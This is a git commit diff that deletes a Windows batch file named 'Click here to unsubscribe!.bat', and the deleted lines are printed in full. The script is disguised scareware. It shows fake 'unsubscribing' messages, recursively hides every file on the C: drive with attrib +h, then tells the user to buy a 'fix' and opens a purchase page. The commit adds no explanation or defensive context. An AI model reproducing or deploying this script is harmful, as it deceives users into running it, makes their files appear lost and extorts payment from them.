f48d339a144ee09555ec19cb851464e8ceec599a
mauritsf <57948944+mauritsf15@users.noreply.github.com>
2020-04-02 14:38:47 +0200

    Delete Click here to unsubscribe!.bat

--- Click here to unsubscribe!.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-echo Unsubscribing. We are currently removing you from the list. Do not close this window.
-echo Please wait up to 5 minutes. This might take shorter, or longer.
-cd C:\ >NUL
-attrib +h * /D /S >NUL
-echo You can get your files back by buying the fix here:
-timeout 3
-start www.autobuy.io/@VirusRemoval
